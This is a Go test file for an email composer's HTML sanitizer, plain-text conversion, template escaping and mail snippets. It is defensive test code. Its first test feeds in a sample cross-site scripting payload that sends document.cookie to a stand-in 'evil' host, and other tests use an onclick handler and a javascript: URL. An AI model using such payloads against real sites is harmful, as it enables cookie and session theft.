package app

import "strings"

import "testing"

func TestSanitizeStripsScript(t *testing.T) {
	in := `<p>Hello</p><script>fetch('//evil/'+document.cookie)</script>`
	got := SanitizeHTML(in)
	if strings.Contains(strings.ToLower(got), "script") {
		t.Fatalf("script survived: %q", got)
	}
	if !strings.Contains(got, "Hello") {
		t.Fatalf("legitimate content lost: %q", got)
	}
}

func TestSanitizeStripsEventHandlers(t *testing.T) {
	// The editor cannot produce this; a hand-crafted request can.
	in := `<p onclick="steal()" onmouseover="x()">Hi</p>`
	got := SanitizeHTML(in)
	if strings.Contains(got, "onclick") || strings.Contains(got, "onmouseover") {
		t.Fatalf("event handler survived: %q", got)
	}
}

func TestSanitizeStripsJavascriptURL(t *testing.T) {
	in := `<a href="javascript:alert(1)">click</a>`
	got := SanitizeHTML(in)
	if strings.Contains(strings.ToLower(got), "javascript:") {
		t.Fatalf("javascript URL survived: %q", got)
	}
}

func TestSanitizeKeepsWhatMailClientsRender(t *testing.T) {
	// Inline styles, tables and images are the whole vocabulary of email
	// layout. Losing them would leave the editor unable to produce anything.
	in := `<table width="600"><tr><td style="font-family:Arial;font-size:14px">` +
		`<b>Bold</b> <a href="https://x.com/a">link</a> ` +
		`<img src="https://cdn/logo.png" alt="Sunrise" width="120"></td></tr></table>`
	got := SanitizeHTML(in)
	for _, want := range []string{"<table", "<td", "style=", "<b>", "href=", "<img", "alt="} {
		if !strings.Contains(got, want) {
			t.Errorf("lost %q from %q", want, got)
		}
	}
}

func TestSanitizeDropsStyleBlock(t *testing.T) {
	// Not just a security choice: Gmail strips <style> anyway, so allowing it
	// would let somebody compose a mail that looks right here and arrives
	// unstyled. Refusing it up front is more honest.
	in := `<style>.x{color:red}</style><p class="x">Hi</p>`
	got := SanitizeHTML(in)
	if strings.Contains(got, "<style") {
		t.Fatalf("style block survived: %q", got)
	}
}

func TestHTMLToTextProducesReadableAlternative(t *testing.T) {
	in := `<p>Dear John,</p><p>We have <b>304 coil</b> available.</p>` +
		`<ul><li>3.0mm</li><li>3.5mm</li></ul><p>Best regards,<br>Li Na</p>`
	got := HTMLToText(in)
	for _, want := range []string{"Dear John,", "304 coil", "• 3.0mm", "• 3.5mm", "Li Na"} {
		if !strings.Contains(got, want) {
			t.Errorf("text alternative missing %q:\n%s", want, got)
		}
	}
	if strings.Contains(got, "<") {
		t.Errorf("markup leaked into the text part:\n%s", got)
	}
}

func TestHTMLToTextDropsInvisibleContent(t *testing.T) {
	// Anything the recipient cannot see in the HTML must not appear in the
	// text part either, or the two versions say different things.
	in := `<style>p{color:red}</style><p>Visible</p>`
	got := HTMLToText(in)
	if strings.Contains(got, "color:red") {
		t.Fatalf("stylesheet leaked into text: %q", got)
	}
	if !strings.Contains(got, "Visible") {
		t.Fatalf("visible text lost: %q", got)
	}
}

func TestHTMLToTextUnescapesEntities(t *testing.T) {
	got := HTMLToText(`<p>Smith &amp; Sons &lt;Trading&gt;&nbsp;Ltd</p>`)
	if got != "Smith & Sons <Trading> Ltd" {
		t.Fatalf("got %q", got)
	}
}

func TestRenderAsHTMLEscapesTheValueNotTheTemplate(t *testing.T) {
	// The template is meant to contain markup; the substituted value is not.
	r := Recipient{Name: "Smith & Sons <Trading>", Email: "x@y.com"}
	tpl := `<p style="font-weight:bold">Dear {{contact_name}},</p>`
	got, missing := RenderAs(tpl, r, me, FormatHTML)
	if len(missing) != 0 {
		t.Fatalf("unexpected missing: %v", missing)
	}
	if !strings.Contains(got, `<p style="font-weight:bold">`) {
		t.Errorf("template markup was escaped: %q", got)
	}
	if !strings.Contains(got, "Smith &amp; Sons &lt;Trading&gt;") {
		t.Errorf("value was not escaped: %q", got)
	}
}

func TestRenderAsTextDoesNotEscape(t *testing.T) {
	r := Recipient{Name: "Smith & Sons", Email: "x@y.com"}
	got, _ := RenderAs("Dear {{contact_name}},", r, me, FormatText)
	if got != "Dear Smith & Sons," {
		t.Fatalf("text render should not escape: %q", got)
	}
}

func TestRenderAsHTMLStillReportsMissing(t *testing.T) {
	// The refusal-to-send guarantee must not be lost in the HTML path.
	blank := Recipient{Email: "x@y.com"}
	_, missing := RenderAs("<p>Dear {{contact_name}},</p>", blank, me, FormatHTML)
	if len(missing) != 1 || missing[0] != "contact_name" {
		t.Fatalf("missing = %v", missing)
	}
}

func TestNormalizeFormatDefaultsToText(t *testing.T) {
	for _, in := range []string{"", "TEXT", "text", "nonsense", "Html "} {
		got := normalizeFormat(in)
		if got != FormatText && got != FormatHTML {
			t.Fatalf("normalizeFormat(%q) = %q", in, got)
		}
	}
	if normalizeFormat("html") != FormatHTML {
		t.Error("lowercase html should normalise to HTML")
	}
	if normalizeFormat("nonsense") != FormatText {
		t.Error("unknown format should fall back to TEXT, not HTML")
	}
}

func TestHTMLToTextDropsInvisibleRunes(t *testing.T) {
	// What bulk senders sprinkle through subject lines to dodge filters. In
	// text they are invisible, so leaving them in means an invisible character
	// sitting in the middle of a word nobody can see or search for.
	got := HTMLToText(`<p>Con&#847;grats&#8203; Fangchen&hellip;</p>`)
	if got != "Congrats Fangchen…" {
		t.Fatalf("got %q", got)
	}
}

func TestSnippetPrefersTextButNotWhenItIsMarkup(t *testing.T) {
	// A sender whose text/plain part is really a whole HTML document. Trusting
	// it put "<!doctype html>..." in front of the person in the mail list.
	got := snippetOf(ParsedMail{
		BodyText: "<!doctype html><html><head><style>.a{color:red}</style></head>" +
			"<body><p>Quote for 500 units</p></body></html>",
		BodyHTML: "<p>Quote for 500 units</p>",
	})
	if got != "Quote for 500 units" {
		t.Fatalf("got %q", got)
	}
}

func TestSnippetKeepsOrdinaryText(t *testing.T) {
	// The common case must not be touched by the markup detour: a plain mail
	// that mentions a tag later on is still plain.
	got := snippetOf(ParsedMail{BodyText: "Hi — is the <b> tag allowed in your template?"})
	if got != "Hi — is the <b> tag allowed in your template?" {
		t.Fatalf("got %q", got)
	}
}
